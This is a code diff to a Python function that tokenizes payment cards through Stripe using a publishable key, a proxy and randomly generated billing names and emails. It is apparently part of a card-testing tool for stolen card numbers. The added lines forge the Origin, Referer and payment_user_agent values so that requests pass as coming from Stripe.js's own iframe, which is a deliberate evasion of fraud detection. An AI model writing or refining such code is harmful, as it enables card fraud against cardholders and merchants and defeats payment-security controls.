@@ -87,15 +87,17 @@ def _random_name():
 async def _create_payment_method(session, cc, mes, ano, cvv, proxy):
     """Tokenize card with Stripe publishable key → PaymentMethod ID"""
     first, last = _random_name()
-    guid = str(uuid.uuid4())
-    muid = str(uuid.uuid4())
-    sid  = str(uuid.uuid4())
+    guid      = str(uuid.uuid4())
+    muid      = str(uuid.uuid4())
+    sid       = str(uuid.uuid4())
+    card_hash = uuid.uuid4().hex[:16]
+    # Requests must appear to originate from Stripe.js's own iframe (js.stripe.com)
     headers = {
         'Authorization': f'Bearer {STRIPE_PK}',
         'Content-Type': 'application/x-www-form-urlencoded',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Origin': STRIPE_SITE,
-        'Referer': STRIPE_SITE + '/checkout/',
+        'Origin': 'https://js.stripe.com',
+        'Referer': f'https://js.stripe.com/v3/elements-inner-card-{card_hash}.html',
         'Stripe-Version': '2023-10-16',
     }
     data = (
@@ -107,7 +109,7 @@ async def _create_payment_method(session, cc, mes, ano, cvv, proxy):
         f'&billing_details[name]={first}+{last}'
         f'&billing_details[email]={_random_email()}'
         f'&billing_details[address][country]=US'
-        f'&payment_user_agent=stripe.js%2F6fd82394'
+        f'&payment_user_agent=stripe.js%2F6fd82394%3B+stripe-js-v3%2F6fd82394%3B+elements-inner-card%2F{card_hash}'
         f'&time_on_page={random.randint(8000, 45000)}'
         f'&guid={guid}'
         f'&muid={muid}'
